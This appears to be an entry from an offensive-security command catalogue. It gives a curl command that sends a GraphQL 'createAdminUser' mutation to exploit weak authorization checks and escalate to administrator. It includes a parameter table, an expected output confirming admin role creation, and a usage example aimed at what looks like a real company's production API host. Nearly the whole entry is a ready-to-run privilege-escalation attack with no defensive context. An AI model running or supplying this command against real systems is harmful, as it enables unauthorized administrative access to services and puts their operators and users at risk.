---
data: >-
  curl -X POST $ENDPOINT -H "Content-Type: application/json" -H "Authorization:
  Bearer $TOKEN" -d '{"query": "mutation { createAdminUser(input: {email:
  \"$EMAIL\", password: \"$PASSWORD\"}) { user { id email role } } }"}'
tags:
  - graphql
  - privilege-escalation
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.667Z'
id: 896d6bc3-7b5a-4c4d-9c0d-fce7c62cf4c4
verified: false
validated: true
submitted: true
---
# graphql-create-admin

## Command

```bash
curl -X POST $ENDPOINT -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" -d '{"query": "mutation { createAdminUser(input: {email: \"$EMAIL\", password: \"$PASSWORD\"}) { user { id email role } } }"}'
```

## Description

Uses GraphQL mutation to create an admin user, exploiting weak auth checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $ENDPOINT | GraphQL URL | Yes |
| $TOKEN | Auth token | Yes |
| $EMAIL | Admin email | Yes |
| $PASSWORD | Admin password | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://tng-api.watsons.com.my/graphql -H "Authorization: Bearer eyJ..." -d '{"query": "mutation { createAdminUser(input: {email: \"admin@test.com\", password: \"adminpass\"}) { user { role } } }"}'
```

## Expected Output

{"data":{"createAdminUser":{"user":{"role":"admin"}}}}

## Related

- [[Related Procedure: Create-Admin-User-via-Mutation]]
